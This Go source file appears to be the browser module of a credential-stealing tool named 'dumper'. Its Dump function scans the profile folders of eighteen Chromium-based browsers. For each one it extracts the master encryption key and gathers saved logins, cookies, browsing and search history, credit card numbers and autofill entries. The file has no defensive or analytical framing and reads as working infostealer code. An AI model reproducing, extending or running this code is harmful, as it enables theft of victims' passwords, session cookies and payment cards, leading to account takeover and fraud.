package chromium

import (
	"dumper/crypt"
	"dumper/file"
)

func Dump() (data map[string]Browser) {
	data = make(map[string]Browser)

	for n, p := range map[string]string {
		"Google Chrome": file.Local + "\\Google\\Chrome\\User Data",
		"Google SxS": file.Local + "\\Google\\Chrome SxS\\User Data",
		"Microsoft Edge": file.Local + "\\Microsoft\\Edge\\User Data",
		"Opera GX": file.Roaming + "\\Opera Software\\Opera GX Stable",
		"Opera Browser": file.Roaming + "\\Opera Software\\Opera Stable",
		"Brave": file.Local + "\\BraveSoftware\\Brave-Browser\\User Data",
		"Amigo": file.Local + "\\Amigo\\User Data",
		"Torch": file.Local + "\\Torch\\User Data",
		"Kometa": file.Local + "\\Kometa\\User Data",
		"Orbitum": file.Local + "\\Orbitum\\User Data",
		"CentBrowser": file.Local + "\\CentBrowser\\User Data",
		"7Star": file.Local + "\\7Star\\7Star\\User Data",
		"Sputnik": file.Local + "\\Sputnik\\Sputnik\\User Data",
		"Vivaldi": file.Local + "\\Vivaldi\\User Data",
		"Epic Privacy Browser": file.Local + "\\Epic Privacy Browser\\User Data",
		"Uran": file.Local + "\\uCozMedia\\Uran\\User Data",
		"Yandex": file.Local + "\\Yandex\\YandexBrowser\\User Data",
		"Iridium": file.Local + "\\Iridium\\User Data",
	} {
		if file.PathExists(p + "\\Local State") {
			masterKey := crypt.GetMasterKey(p + "\\Local State")

			data[n] = Browser {
				Accounts: queryAccounts(p, masterKey),
				Cookies: queryCookies(p, masterKey),
				WebHistory: queryWebHistory(p),
				SearchHistory: querySearchHistory(p),
				CreditCards: queryCreditCards(p, masterKey),
				Autofill: queryAutofill(p),
			}
		}
	}

	return data
}
